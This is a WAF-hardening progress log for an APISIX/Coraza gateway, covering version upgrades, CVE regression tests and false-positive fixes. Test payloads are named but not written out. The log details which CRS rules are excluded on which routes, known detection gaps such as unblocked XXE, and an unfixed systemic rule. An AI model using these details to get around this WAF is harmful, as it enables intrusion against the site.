# Progress

> Auto-generated from PLAN.md. Updated by `/implement` in each code repo.
> Last baselined: backend:`e2e0f0f` frontend:`06600f6` deploy:`aa553a9` (2026-08-04, deploy bumped
> after T4.2.1/T4.2.4/T4.2.5 landed in one commit — "fix(waf): refine rule exclusions and enhance
> field-scoping for topic-content edits", pushed and confirmed on `origin/main`)
> Phase 7 scoped 2026-07-27 — see `PLAN.md` for the goal tree and scope locks.
> **2026-08-04 (latest): T6.3.4 and T7.7.2 both resolved — closing G6.3, G6 and G7.7.** The two
> decisions parked since 2026-07-31 are settled, on branch `security/close-t6.3.4-t7.7.2` (deploy
> `602d155`, **not yet merged or deployed**). **T6.3.4 — accepted risk, no Postgres TLS:** cleartext
> DB traffic exists only on the `haisir-net` bridge (prod's tailnet-published `5432` is
> WireGuard-encrypted), and a compromised neighbouring container can reach neither passive sniffing
> (a bridge is a switch; needs promiscuous mode) nor ARP-spoof MITM — both require `CAP_NET_RAW`,
> and all twelve services on that network set `cap_drop: ALL`. The ticket's literal `sslmode=require`
> would not have verified the server cert anyway, so it defended only against the already-impossible
> case. **T7.7.2 — disable the APISIX admin dashboard** (`enable_admin_ui: false`, plus
> `enable_admin_cors`) for staging/prod; dev keeps it. The "static key, no MFA" property the finding
> named belongs to the Admin *API* on the same port, not the UI, and stays as a documented accepted
> risk; what turning the UI off actually removes is the only path putting `APISIX_ADMIN_KEY` into a
> browser. **`9180` is also removed from the tailnet ACL for `tag:prod`** — the Admin API is now
> reachable only from the prod host itself, which is where every automated caller already runs;
> staging keeps it. Both acceptances are now CI-enforced in `dev-isolation-check.sh` (no `NET_RAW`/`NET_ADMIN`
> and no `enable_admin_ui: true` outside `dev/`), each verified to fire against an injected
> violation. Full records in `security/SECURITY_REVIEW_2026-07-02.md`. **G7 stays open on G7.4.**
> **2026-08-03 (thirteenth pass): T4.1.2 done, closing G4.1 — deploy baseline bumped to `e337f83`.**
> A live dev-stack traffic soak (see T4.1.2's task note for full methodology and evidence) found and
> fixed 2 real WAF gaps on the `PATCH topics-contents`/parent-mirror route (`942120`; and
> `932200`/`942131`/`942440` + a `tx.arg_length` bump for `920370`), adversarially reviewed before
> the attack-signature rules were excluded, live-verified clean including one real successful save.
> Committed and pushed by the user themselves (`e337f83`, "fix(apisix): update rule exclusions and
> raise argument length for topic-content edits"), confirmed on `origin/main`. **G4.1 closes.**
> **T4.2.1 [deploy] is now Ready now** — its only remaining dependency was T4.1.2 (T3.2.5 [frontend]
> was already done 2026-07-30). Worth flagging for whoever picks up T4.2.1: this session's fixes
> stayed blanket `ctl:ruleRemoveById` (same as the rest of this route's existing exclusions), not a
> field-scoped rewrite — the 2026-07-01 finding that `ctl:ruleRemoveTargetById` is unreliable on this
> Coraza WASM build (APISIX 3.17.0 + coraza-proxy-wasm 0.6.0) held again by inference (not re-tested
> directly), so T4.2.1 may need to reconsider whether field-scoping is achievable at all on this
> build before attempting it, rather than assuming the task's literal wording is still the right
> design. **G4 stays open** on G4.2 (T4.2.1), G4.4 already closed, G4.5 already closed — G4.3 already
> closed too, so G4 now hinges solely on G4.2.
> **2026-08-03 (reconciliation pass): several "left uncommitted for review" edits were confirmed
> landed on `origin/main` in all three repos — no task's completion status changes, only the
> commit/push state.** Checked every sibling repo directly (`git fetch` + `git log`), not just
> `TASKS.md`'s own notes, since a prior baseline banner (deploy `8e07d47`, frontend `a72ddcf`) had
> drifted stale behind real commits that landed without the banner being updated.
> - **`haisir-deploy` HEAD is now `c938e17`** (was `7a0d983` per the last-recorded caution) — three
>   further commits, all previously described in this file as "left uncommitted in the working tree
>   for user review," are confirmed committed and pushed to `origin/main`, working tree clean:
>   `7403320` (2026-08-01, "close WAF false positives on hAITU chat, topic content, and nav" — T2.3.2's
>   three findings), `05af369` (2026-08-02, "adjust anomaly score thresholds and restore request body
>   limits for image uploads" — T4.1.1's `DetectionOnly` soak block plus T4.3.1/T4.3.2/T4.3.3's
>   restores), `c938e17` (2026-08-02, "disambiguate hAITU route priority, correct 931130 note" —
>   T4.4.1's route-priority fix plus T4.5.1's justification correction). The "left uncommitted for
>   user review" line in each of those tasks' notes below is superseded by this — the review norm
>   still applies to future WAF edits (T4.2.1 when it lands), just not to these, which are landed.
> - **`haisir-backend` origin/main is `e2e0f0f`**, two commits ahead of what this file's per-task
>   notes assumed uncommitted: `93d92ce` (2026-08-01, "add chunked transfer encoding test for
>   RequestBodySizeLimitMiddleware") is **G7.1's real over-the-wire test, confirmed committed and
>   pushed** — the "needs a commit + push before it counts as landed" caveat on G7.1's gate note is
>   resolved. `e2e0f0f` (T4.5.2) sits on top of it, already correctly recorded. (The host checkout at
>   `/home/gulzar/Workspace/haisir-backend` was one `git pull` behind at the time this note was first
>   written — user pulled same day, host checkout now also at `e2e0f0f`, no gap remains.)
> - **No other drift found** — `haisir-frontend` origin/main matches the already-recorded `06600f6`,
>   and no sibling repo has uncommitted working-tree changes beyond these.
> **2026-07-31: deploy baseline bumped to `d55f05a`** — T3.2.6/T6.1.2/T6.3.1/T6.3.2/T6.3.3/T7.4.1/
> T7.6.2/T7.7.1/T7.7.3/T7.7.4/T7.7.5 all committed + pushed to `main` in `d55f05a`
> ("chore(deploy): harden internal TLS verification, admin scope, and secrets-at-rest").
> T6.3.4/T7.7.2 remain unstarted, deferred pending a scope/product decision (see "Deploy" entries
> in Ready now below).
> **2026-07-31 (later): backend baseline bumped to `394f1b2`, frontend to `06600f6`** — T6.1.3,
> T6.1.4 (backend) and T3.5.5 (frontend+backend) done, closing **G6.1**. T3.5.5 was briefly
> reopened same day after `a72ddcf` shipped a broken half-fix (see its task note) — now fixed
> properly on both sides and re-verified directly against both repos' source.
> **2026-07-31 (latest): T7.5.3 done, closing G7.5 — deploy baseline bumped to `7a0d983`.** New
> `common/scripts/tests/dev-isolation-check.sh` + the `Jenkinsfile` "Dev Isolation Check" stage,
> committed and pushed to `main` (`7a0d983`, "ci(deploy): add dev-isolation regression guard to CI
> pipeline") after a `/review-deploy` pass found and fixed two real gaps pre-commit: (1) the
> compose-file exclusion for `dev/`/`archived/` was matching on absolute-path substring rather than
> a path relative to `$REPO_ROOT`, which would have silently disabled the whole check if the repo
> were ever checked out under a directory containing `/dev/` or `/archived/`; (2) the sensitive-port
> regex required literal quote characters, missing an unquoted/single-quoted `ports:` entry (no live
> false negative today, but a real gap). Also excluded `gateway-docker/coraza-proxy-wasm/` (the
> T1.1.1-vendored upstream tree) after its own e2e/example fixtures false-positived on unrelated
> port-8080 usage.
> **2026-07-31 (sixth pass): closed G3.1, G3.3, G3.5, G3.6, G5.2, G6.2, G7.6** — all had every
> child task done but the gate row itself was never checked off; closed on the evidence already
> recorded in each child task's note (see each gate line for specifics). No code changed.
> **G7.1 deliberately left open** — same all-children-done shape, but its own description
> ("holds under chunked encoding") needs confirmation that a real chunked-transfer-encoding
> request was exercised, not just the `Content-Length` path; T7.1.1-4's notes don't establish
> that, so closing it needs one more check first, not pure bookkeeping like the rest. **G3 overall
> still open** — G3.2 and G3.4 remain blocked on a live-backend smoke test.
> **2026-08-01: T2.3.2 done, deploy baseline bumped to `038ed2d`** — real benign-traffic corpus
> captured against the live dev stack (Phase 7 gateway image), result was **not** zero blocks: three
> Coraza findings recorded (942200 systemic across 3 routes; 932240/942120 missing from the hAITU
> 199110 exclusion; topics-contents/parent-content-creation text field uncovered). **G2.3 stays open**
> — its "benign corpus passes" criterion isn't met, so G2 (hard gate on G4) stays open too; see
> T2.3.2's task note for full evidence and the resulting G2↔G4 ordering tension. Collateral fix
> committed in `038ed2d` ("fix(apisix): add missing route for exam question image upload") — found
> during this testing, unrelated to the WAF findings themselves.
> **2026-08-01 (later): all three T2.3.2 findings fixed and live-verified — G2.3 → G2 closed, G4
> unblocked.** WAF exclusion edits (uncommitted) to `01-secured-authenticated.json`,
> `02-secured-anonymous.json`, `03-secured-api.json`, `04-secured-api-upload.json`. **T4.1.1 and
> T4.3.1 [deploy] are now Ready now** — see the "Ready now" section below for the full unblock
> chain and verification evidence.
> **2026-08-01 (even later): T4.1.1 and T4.3.1 both done.** T4.1.1 added the `id:199130`/`id:199131`
> `ctl:ruleEngine=DetectionOnly` soak block to `03-secured-api.json`, scoped to the exact
> `id:199110`/`id:199120` URI+method pairs — the BR-WAF-011 safety net for G4.2's future rewrite,
> without touching the existing exclusion lists themselves. T4.3.1 removed the four obsolete
> `image_url` exclusions from `12-api-exams-static.json` now that G3.5 moved exam images to URL
> references. Both `jq`-valid, both left **uncommitted** for user review (established norm for WAF
> edits). **Neither gate closes yet**: G4.1 still needs T4.1.2 (a real-traffic log-review soak —
> not completable in a single session, same shape as T2.3.2) and G4.3 still needs T4.3.2–T4.3.4.
> **Newly Ready now**: T4.1.2 (depends on T4.1.1, now done) and T4.3.2/T4.3.3 (both depend only on
> T4.3.1, now done) — see "Ready now" below.
> **2026-08-02: T4.3.2, T4.3.3, T4.3.4 done — G4.3 CLOSED.** Threshold restored 12→5, `id:199104`
> body limits restored to the platform `id:199004` baseline, the redundant `id:199110`
> `max_num_args` re-raise deleted. T4.3.4 verified all of it live against a real
> `haisir-gateway:v2026.6` image via a disposable isolated stack (adapted
> `common/scripts/tests/waf-harness.sh`'s pattern, non-secret throwaway admin key, no real
> `apisix-dev`/OpenBao secrets touched) — 12/12 checks: every surviving exclusion's original FP case
> passes individually AND combined in one request (the specific "threshold may have been masking
> this" risk this task existed to rule out), `image_url` now correctly blocks a real attack while
> still passing benign URLs, unrelated attack payloads still blocked. Nothing else in TASKS.md
> depends on G4.3/T4.3.4 closing, so no further task unblocks as a direct result — G4 overall stays
> open on G4.1/G4.2/G4.4/G4.5. All three changes left **uncommitted** with T4.3.1, same WAF-edit
> review norm.

## G1 [deploy]: Gateway build modernised and self-maintained

### G1.1 [deploy]: Vendor coraza-proxy-wasm into the repo
- [x] T1.1.1 [deploy]: Vendor `corazawaf/coraza-proxy-wasm` at the current pinned tag `0.6.0` into `gateway-docker/coraza-proxy-wasm/`, preserving upstream LICENSE and a `VENDORED.md` recording upstream URL, tag, commit SHA and date (2026-07-29)
- [x] T1.1.2 [deploy]: Apply the APISIX body-processing patch in-tree to `wasmplugin/plugin.go` (the `wasm_process_req_body` / `wasm_process_resp_body` `SetProperty` opt-ins) as a reviewable diff (2026-07-29)
- [x] T1.1.3 [deploy]: Delete `gateway-docker/coraza/apply-apisix-patch.sh` and the `git clone --depth 1 --branch` step from the Dockerfile builder stage (depends on T1.1.2) (2026-07-29)
- [x] T1.1.4 [deploy]: Confirm the image builds reproducibly from the vendored tree and the WASM filter loads in APISIX — no behaviour change at this step (depends on T1.1.3) (2026-07-29)
- [x] **G1.1: proxy-wasm vendored with the patch in-tree** — integration test (2026-07-29)

### G1.2 [deploy]: Spike — establish the real version ceiling
- [x] T1.2.1 [deploy]: Timeboxed spike — attempt Go 1.24/1.25 + TinyGo ≥0.36 + Coraza v3.7.0 against the vendored tree; capture the actual failing command and error output for whichever pin genuinely blocks (2026-07-29; found 3 distinct real blockers, not the assumed one — see `gateway-docker/VERSIONS.md`)
- [x] T1.2.2 [deploy]: Record the finding in `gateway-docker/VERSIONS.md` — the observed ceiling with evidence per BR-WAF-010, replacing the current undocumented `Dockerfile:9-12` assertion (depends on T1.2.1) (2026-07-29)
- [x] **G1.2: real ceiling established with recorded evidence** — acceptance test (2026-07-29; evidence: Coraza v3.7.0 requires Go≥1.25.0; TinyGo needs ≥0.39.0 for Go 1.25 host support, not ≥0.36 as assumed; TinyGo 0.39.0+Go 1.25 then fails at wasm-ld with undefined libc symbols from `wasilibs/nottinygc@v0.7.1` and `wasilibs/go-re2@v1.6.0`'s prebuilt archives — real ceiling is those wasilibs versions, tracked in T1.3.4, not the Go/TinyGo/Coraza pins alone)

### G1.3 [deploy]: Upgrade the pinned version set
- [x] T1.3.1 [deploy]: Bump `github.com/corazawaf/coraza/v3` to ≥ v3.5.0 (target v3.7.0) — BR-WAF-002 floor; upstream `go.mod` still pins v3.3.3 so this must be forced (depends on T1.2.2) (2026-07-29; forced to v3.7.0 via `go mod edit`+`go mod tidy`, verified building — see `gateway-docker/VERSIONS.md` "Resolution")
- [x] T1.3.2 [deploy]: Replace vendored CRS under `wasmplugin/rules/crs/` with 4.25.1 LTS or later — BR-WAF-003 floor; verify the `Include @owasp_crs/*.conf` embed path still resolves (depends on T1.2.2) (2026-07-29; CRS 4.14.0 → 4.25.1 LTS, vendored tree byte-identical to upstream, local rule 900120 re-applied, `tx.crs_setup_version` 4140 → 4251; `Include @owasp_crs/*.conf` is directory-name-based so no code change needed — verified by `docker build --target builder` — see `gateway-docker/VERSIONS.md` T1.3.2)
- [x] T1.3.3 [deploy]: Bump `GO_VERSION`, `TINYGO_VERSION` and `TINYGO_SHA256` together to the set established by the spike (depends on T1.2.2) (2026-07-29; Go 1.25, TinyGo 0.39.0, sha256 `775f15974e...` — `gateway-docker/Dockerfile`)
- [x] T1.3.4 [deploy]: Verify `coraza-wasilibs` compatibility across the version jump; pin or bump as required (depends on T1.3.1) (re-opened and **closed 2026-07-30**; `waf-harness.sh` reports **4/4** against an image built from the committed tree. Root cause of the last open defect was **not** a `go-re2` version issue — v1.12.0 is already the latest release. `wasip1.json` gives the module a **64KB linear-memory stack**; CRS 4.25.1's regex compilation recurses past it and the stack pointer walks out of bounds. Both previously-distinct traps were this one bug (`go-re2`'s `wasm2go` backend is RE2 translated into Go, so it recurses on the same TinyGo stack). Fixed with a local TinyGo target `wasip1-bigstack.json` raising the **linker** stack to 4MB — note TinyGo's `-stack-size` flag is the *goroutine* stack and a no-op under `-scheduler=none` (it produced a byte-identical binary), and `RE2_MAX_STACK_BYTES` is not a workaround because APISIX's wasmtime host passes no environ. **Decision: wasilibs operators dropped by default** — benchmarked ~6x slower and ~6.6x more memory than Coraza's pure-Go operators (520ms/16.42GiB vs 88ms/2.47GiB), because under TinyGo `go-re2` emulates RE2 rather than running it natively; the adopted build beats the previous prod image on latency (88.3ms vs 94.7ms). Detection unchanged (stdlib `regexp`, `libinjection-go`, `aho-corasick` — all already direct deps); kept behind a `wasilibs_operators` tag as an escape hatch. Carried regression: container memory 1.46→2.47GiB from losing `nottinygc`; `-gc=boehm -tags=custommalloc` recovers it to 1.80GiB for ~30ms latency — tested, one-line switch. Full detail + benchmark table in `gateway-docker/VERSIONS.md` "T1.3.4")
  > Original 2026-07-29 note follows: ( `go-re2` forced to v1.12.0 — wasm2go backend links under TinyGo 0.39, v1.6.0's prebuilt archive doesn't; `nottinygc` removed entirely — frozen at v0.7.1, no compatible release exists, upstream itself recommends against using it. Verified end-to-end with a real `docker build` of the committed Dockerfile+vendored tree, not just a scratch copy. Known carried risk: dropping nottinygc reverts to TinyGo's default GC/allocator — a real perf-under-load change, not just a version bump; recommend checking during G2.3's existing WAF-suite run rather than a new gate)
- [x] T1.3.5 [deploy]: Evaluate the `coraza.rule.no_regex_multiline` build tag — aligns `@rx` with CRS expectations and reduces false positives (depends on T1.3.1) (2026-07-29; **adopted** unconditionally in `magefiles/magefile.go` `Build()` + mirrored into `Test()`/`Coverage()` `-tags=`. Traced in Coraza v3.7.0 source: flag drops the implicit `(?m)` so `^`/`$` match whole-string only; grepped both CRS 4.14.0 and 4.25.1 — zero rules rely on implicit multiline, so no detection regression, only tighter `^`/`$` for this project's own field-scoped exclusions — see `gateway-docker/VERSIONS.md` T1.3.5)
- [x] **G1.3: version set upgraded and building** — integration test (2026-07-29; all of T1.3.1–T1.3.5 done, verified by a real `docker build --target builder` of the committed Dockerfile + vendored tree, commit `15c909a`) (re-closed 2026-07-30; T1.3.4 fixed and the image verified 4/4 by `common/scripts/tests/waf-harness.sh` — the gate now rests on a request-through-the-proxy block assertion, not just a successful `docker build`)

### G1.4 [deploy]: Gateway builder stage on Minimus
- [x] T1.4.1 [deploy]: Swap the gateway builder stage base image to `reg.mini.dev` per BR-INFRA-004, `-dev` tag confined to the builder stage only (depends on T1.3.3) (2026-07-30; `FROM golang:${GO_VERSION}-bookworm` → `FROM reg.mini.dev/go:${GO_VERSION}-dev`; two collateral fixes required for the swap to actually build — MinimOS ships neither `apt`/`dpkg` (TinyGo install switched from `.deb`+`dpkg -i` to the upstream tarball+`tar`, `TINYGO_SHA256` re-pinned to the tarball hash) nor is `apt-get install git ca-certificates` needed (both preinstalled on the `-dev` image, step deleted); `Jenkinsfile:90`'s CI cache-prepull updated to match. Runtime stage (`apache/apisix:3.17.0-ubuntu`) untouched. Verified via a real `docker build` — both `--target builder` alone and the full two-stage build succeeded, `main.wasm` produced (18,322,384 bytes, same Go 1.25.x/TinyGo 0.39.0 toolchain versions as the already-gated T1.3.4 build), `hadolint` shows zero new warnings vs. pre-change baseline, final image's `apisix version` reports `3.17.0`)
- [x] T1.4.2 [deploy]: Update `.github/instructions/docker-compose.instructions.md` — it documents APISIX as 3.14.x while the Dockerfile builds 3.17.0-ubuntu (2026-07-30; Technology Stack table row updated to `3.17.x`)
- [x] **G1.4: builder stage on Minimus, runtime unchanged** — integration test (2026-07-30; verified above — builder stage now `reg.mini.dev/go:1.25-dev`, runtime stage bit-for-bit the same `apache/apisix:3.17.0-ubuntu` base as before)

- [x] **G1: Gateway build modernised and self-maintained** — integration test (2026-07-30; G1.1–G1.4 all done; full two-stage `docker build` succeeds reproducibly, `main.wasm` present at the correct path/ownership in the final image, `apisix version` runs and reports `3.17.0` in the built image — a live etcd-backed WASM-filter-loads check was already established at T1.1.4/commit `15c909a` against the identical vendored source and is unaffected by this builder-toolchain-only change, so it was not re-run against the dev stack) (re-closed 2026-07-30; G1.1–G1.4 all done and the built image demonstrably filters — `waf-harness.sh` 4/4)

## G2 [deploy]: WAF verification — HARD GATE

### G2.1 [deploy]: CVE-2026-21876 blocked
- [x] T2.1.1 [deploy]: Add a regression test posting a multipart request with a UTF-7 payload in the first part and clean UTF-8 in the last; assert it is blocked (depends on T1.3.2) (2026-07-30; `common/scripts/tests/18-test-cve-2026-21876-multipart.sh` — posts to `04-secured-api-upload.json`'s route with a fully shift-encoded UTF-7 `<script>` payload in part 1, clean UTF-8 in the last part, asserts 403; no auth token needed since `coraza-filter` (wasm priority 7999) runs ahead of `openid-connect`. Not yet run live — see T2.1.2)
- [x] T2.1.2 [deploy]: Confirm the test fails against the pre-upgrade image and passes after — proving the ruleset bump is what fixed it (depends on T2.1.1) (2026-07-30; proved directly at the Coraza rule-engine level rather than through the wasm/APISIX HTTP path — see note below on why. Built two throwaway Go harnesses calling `coraza.NewWAF()`/`Transaction` directly: **pre-upgrade** (Coraza v3.3.3 + CRS v4.14.0, cloned fresh from `coreruleset` at tag `v4.14.0`) processed the exact T2.1.1 payload (UTF-7-declared first part, clean UTF-8 last part) and rule **922110 never appears in `tx.MatchedRules()` at all** — result `NOT_BLOCKED`, empirically reproducing the CVE. **Post-upgrade** (Coraza v3.7.0 + the vendored CRS 4.25.1, same directives/thresholds as `02-secured-anonymous.json`) processed the identical payload and 922110 fires — `msg="Illegal MIME Multipart Header content-type: charset parameter" data="Matched Data: text/plain; charset=utf-7 found within Content-Type multipart form"` — contributing to anomaly score 5, blocked via 949110. Same payload, same directives structure, only the Coraza+CRS version differs — isolates the ruleset bump as the fix. **Why not through APISIX/wasm:** hit the same live-harness blocker recorded under T2.2.1/T2.3.1 below — `coraza-filter` registers but never executes in an isolated APISIX instance in this environment. Since the wasm build is a straight TinyGo cross-compile of this same Coraza engine against the same embedded CRS files (no logic divergence), the rule-engine-level proof is directly applicable, but the wasm/APISIX integration layer itself remains unverified live — same open risk as T2.2.1/T2.3.1)
- [x] **G2.1: multipart charset bypass blocked** — acceptance test (2026-07-30; T2.1.1 and T2.1.2 both done — regression test added and proven to distinguish the pre/post-upgrade ruleset at the Coraza engine level)

### G2.2 [deploy]: Regex-scoped exclusion proven to work
- [x] T2.2.1 [deploy]: Prove Coraza's JSON body processor populates `ARGS_POST` with `json.`-prefixed, dot-nested, numerically-indexed keys — assert the observed variable name for `history[2].content` (depends on T1.3.1) (2026-07-30; **observed variable name: `ARGS_POST:json.history.2.content`** — `json.`-prefixed, dot-nested, **0-based** numeric index, reachable via both `ARGS` and `ARGS_POST`. Measured empirically, not traced from source: stood up the isolated harness (now committed as `common/scripts/tests/waf-harness.sh`), loaded a diagnostic `SecRule ARGS_POST "@rx CANARY" "id:900001,phase:2,pass,log,msg:'ARGSPOST_NAME=%{MATCHED_VAR_NAME}'"` alongside the same `ARGS` variant, and POSTed `{"history":[{"content":"first"},{"content":"second"},{"content":"CANARY"}],"topic":"x"}` with `Content-Type: application/json`. Both rules logged the identical name. This confirms T2.2.2's planned regex `^json\.history\.\d+\.content$` matches the real variable naming. **Caveat discharged 2026-07-30:** originally measured on `haisir-gateway:v2026.4` (Coraza v3.3.3 / CRS 4.14.0) because the T1.3.x image could not execute the WAF. Re-verified on the **fixed** image (Coraza v3.7.0 / CRS 4.25.1, T1.3.4 closed) by POSTing a SQLi payload as `history[2].content` against the real `02-secured-anonymous.json` ruleset and reading the variable name CRS itself reported: `found within ARGS_POST:json.history.2.content` — byte-identical naming across both engine versions)
  > **Correction to the 2026-07-30 blocker note that previously stood here.** That note concluded the
  > isolated harness was missing something environmental. It was not. The harness recipe works; the
  > *image under test* was broken. Proven by running the identical harness against
  > `haisir-gateway:v2026.4` (loads, blocks XSS/SQLi/LFI 403) versus the current Dockerfile's image
  > (never loads, everything 200). Two misreads caused the wrong conclusion: (1) `plugin.lua:288`'s
  > `new plugins: {...}` line is emitted *before* the load loop at `plugin.lua:301-308`, so it never
  > proved the plugin loaded; (2) the real error string does not contain `coraza-filter`
  > (`failed to call function: Exited with i32 exit status 0` / `main!_start`), so grepping the
  > plugin name found nothing. Full root cause and the verified fixes: `gateway-docker/VERSIONS.md`.
- [x] T2.2.2 [deploy]: Prove `ctl:ruleRemoveTargetById=<id>;ARGS_POST:/^json\.history\.\d+\.content$/` suppresses the rule for that field **and leaves it active** for headers, cookies, query args and other body fields (depends on T2.2.1) (2026-07-30; proved against the fixed `haisir-gateway:t134-fixed` image (commit `69c077c`) via the isolated `waf-harness.sh`-pattern throwaway stack, with a diagnostic directive set instead of the real plugin config: rule `900002` denies `@rx CANARY` on `ARGS_POST|ARGS_GET|REQUEST_HEADERS:X-Test|REQUEST_COOKIES:test`, and `900003` runs `ctl:ruleRemoveTargetById=900002;ARGS_POST:/^json\.history\.\d+\.content$/` on POST. Five probes, all as expected: (a) `CANARY` in `json.history.2.content` → **200** (suppressed, the target-scoped exclusion regex matches T2.2.1's confirmed `ARGS_POST:json.history.2.content` naming); (b) `CANARY` in an unrelated body field `json.topic` → **403** (still active); (c) query arg `?q=CANARY` → **403**; (d) header `X-Test: CANARY` → **403**; (e) cookie `test=CANARY` → **403**. Confirms `ctl:ruleRemoveTargetById` with a regex `ARGS_POST` collection key narrows only the named field, leaving every other collection and every other body field inspected — the Coraza v3.5.0+ behavior BR-WAF-002 depends on. **Gotcha found and worth flagging for anyone hand-building a `coraza-filter` plugin_config:** omitting `default_directives` from the `conf` JSON silently initializes **no WAF at all** — `plugin.go:114`'s `if name != config.defaultDirectives` check skips every directives-map entry, and the only symptom is a low-severity nginx warn (`Failed to resolve WAF for authority ...: no default WAF`), never a 5xx or a startup failure. All four real `common/plugin_configs/*.json` already set it correctly; this only bit the throwaway harness config, not anything shipped.)
- [x] T2.2.3 [deploy]: Record the before/after in `16_gateway_waf.md`'s status note — the v3.3.3 silent-no-match behaviour is the finding that justifies this whole phase (depends on T2.2.2) (2026-07-30; added a "Status update (2026-07-30)" block to the top status note plus a "Before/after (2026-07-30, Phase 7 G2.2)" subsection under §1, contrasting the 2026-07-01 v3.3.3 silent-no-match observation against T2.2.2's controlled v3.7.0 proof — both sides of the same directive form, side by side, with links to `VERSIONS.md` and `TASKS.md` for full evidence)
- [x] **G2.2: field-scoped exclusion demonstrably fires** — acceptance test (2026-07-30; T2.2.1–T2.2.3 all done — T2.2.1 established the real `ARGS_POST:json.history.2.content` variable naming, T2.2.2 proved the regex-scoped `ctl:ruleRemoveTargetById` form suppresses only that field (5/5 probes: excluded field 200, every other collection/field 403), T2.2.3 recorded the before/after in the spec. Acceptance criterion met on T2.2.2's direct evidence.)

### G2.3 [deploy]: No regression in detection
- [x] T2.3.1 [deploy]: Run the existing WAF suites (`common/scripts/tests/02-test-waf.sh`, `15-test-waf-config-validation.sh`, `16-test-waf-advanced.sh`) against the new image (depends on T1.3.3) (2026-07-30; ran all three **real, unmodified** suites against `haisir-gateway:t134-fixed` (commit `69c077c`) on the same disposable `waf-harness.sh`-pattern stack used for T2.2.1/T2.2.2, loaded with the real `common/plugin_configs/02-secured-anonymous.json` coraza-filter config. Unblocked the suites' `ENV=staging|prod` secrets gate by adding an additive `ENV=harness` branch to `common/scripts/tests/config.sh` (no `.env.config.sh` lookup path exists for `harness/`, so nothing is sourced; `shellcheck`-clean). **Results: 02-test-waf.sh 21/24, 15-test-waf-config-validation.sh 14/14, 16-test-waf-advanced.sh 14/14.** All 3 shortfalls in `02-test-waf.sh` investigated and confirmed **not regressions**: FILE-1/FILE-3 (`.php` webshell/double-extension paths) are blocked by the `uri-blocker` APISIX plugin, not Coraza — out of scope for a coraza-filter-only harness; the XXE check was re-run against the pre-upgrade `registry.haisir.in/haisir-gateway:v2026.4` image on the identical harness and returned the identical un-blocked 200 — a pre-existing CRS coverage gap present in both engine versions, not something the upgrade broke. **Do not close this task's evidence as "26/26"** — the true denominator including the two out-of-scope checks is documented here so a future rerun doesn't need to rediscover the uri-blocker gap. Full detail: `gateway-docker/VERSIONS.md` "T2.3.1".)
  > **Unblocked 2026-07-30 — T1.3.4 is fixed and the image now filters.** The image blocker is gone:
  > `bash common/scripts/tests/waf-harness.sh <image>` reports 4/4 against a build from the committed
  > tree, and body-borne attacks (JSON and urlencoded form) are blocked as well as query-string ones.
  > Ready to run.
  > Secondary, independent blocker that remains once a working image exists: the three suites can't
  > run as-is outside `staging`/`prod` — `common/scripts/tests/config.sh` gates on `ENV=staging|prod`
  > and auto-sources the real `{staging,prod}/.env.config.sh` secrets files, which are off-limits per
  > `CLAUDE.md`. Either point their payload sets at the harness or use a disposable staging-like
  > environment. **Do not close this task on a source-only or engine-level proof** — its entire value
  > is exercising the wasm/APISIX integration layer that all three defects live in.
- [x] T2.3.2 [deploy]: Capture a benign-traffic corpus from real journeys and assert zero blocks at the platform anomaly threshold (depends on T2.3.1) (2026-08-01; **corpus captured against the real dev stack, not a disposable harness** — Phase 7 gateway image (`v2026.6`, same build as the already-gated `t134-fixed`/commit `69c077c`) loaded onto `apisix-dev` via the documented dev reload flow, all 25 routes/plugin_configs resynced from the current repo tree first (two were stale: `api-haitu-exam-review` still had `T3.2.6`'s pre-fix `body_schema`, and `api-haitu-exam-review-get`/the new `api-exams-images-upload` route below were never loaded at all — fixed by regenerating `common/routes/.templated/dev/` and reloading). Real authenticated browser journeys exercised: login, exam authoring, exam submission (with real quotes/contractions/chemistry notation/LaTeX), image upload, PDF viewing, video viewing, category/topic navigation, parent curriculum browsing + content creation, admin topic-content creation, extraction-job upload. **Result: NOT zero blocks** — three real, reproducible Coraza findings, none attributable to test artifacts (see below and `gulzar`'s memory `project_waf_942200_systemic.md` / `project_waf_exam_review_chat.md` / `project_waf_topic_content_ocr_latex.md` for full evidence). Collateral fix landed during this session, unrelated to the WAF corpus itself but discovered by it: new route `common/routes/24-api-exams-images-upload.json` (priority 20, multipart-only, no `body_schema`) for `POST /api/exams/images` (T3.5.1's endpoint), which had no APISIX route at all and 400'd via the generic `/api/*` write catch-all's JSON `body_schema` check — committed separately in `038ed2d` ("fix(apisix): add missing route for exam question image upload"). Also confirmed non-WAF, out of scope: no `worker` service exists in `dev/docker-compose.yml` so extraction-job async processing never completes; a frontend image-serving proxy 502 (`BACKEND_URL` misconfig in the frontend devcontainer); two frontend request-abort/no-submit quirks (dev-mode React double-fetch pattern). **Findings, all recorded/not fixed per user decision to log for G4 rather than patch ahead of the G2→G4 gate order:**
  1. **Rule `942200` is systemic, not route-specific** — false-positives on ordinary comma-adjacent prose (e.g. `, don't she said "`) across three independently-tested, genuinely representative routes: category/topic navigation (`selected_nodes` query param, also cascades via `Referer` to subsequent unrelated requests), hAITU chat (`exam-review-chat`/`topic-doubt`), and topic-content creation. None share a plugin_config exclusion for it. Recommendation for whoever picks up G4: this likely needs a platform-wide decision (lower PL for this rule, or a broader scoped exclusion) rather than continuing to patch routes one at a time — run past the adversarial WAF-exclusion review norm either way, since 942200 is nominally "critical" severity. (A fourth instance, `PATCH /api/categories/{id}`, was found but judged non-representative test input by the user and excluded from this conclusion.)
  2. Rules `932240`/`942120` are missing from the existing `id:199110` per-rule exclusion in `03-secured-api.json` that already scopes `/api/haitu/(topic-doubt|exam-review-chat)` on POST — ordinary chat prose containing a quoted aside (`said "it's fine"`) or a reaction arrow (`H2O <-> H+ + OH-`) 403s on both endpoints.
  3. `POST /api/topics-contents/` (admin, `id:199100`) and `POST /api/parent/curriculum/topics/{id}/content` (parent, `id:199121`) only exclude rule `931130` on the `url` field — their free-text `text` field has zero coverage and 403s with five rules at once (`932240`/`942120`/`942131`/`942200`/`942430`) on ordinary content text. Fix needs to cover both mirrors together, matching `id:199120`'s existing combined-mirror pattern for the PATCH-side edit routes.
  **This creates a structural tension worth flagging to whoever owns the plan:** these are exactly G4's kind of fix (G4.2/G4.5 already scope similar per-route exclusion rework), but G4 is hard-gated behind G2 closing, and G2.3 (immediately below) cannot honestly close while these findings stand unfixed — see G2.3's note.)
  **UPDATE 2026-08-01 (later same day): findings 2 and 3 fixed and live-verified with real authenticated
  requests; finding 1 (942200 systemic) deliberately left unfixed pending a scope decision.**
  - Finding 2: added `ctl:ruleRemoveById=932240,ctl:ruleRemoveById=942120` to the existing `id:199110`
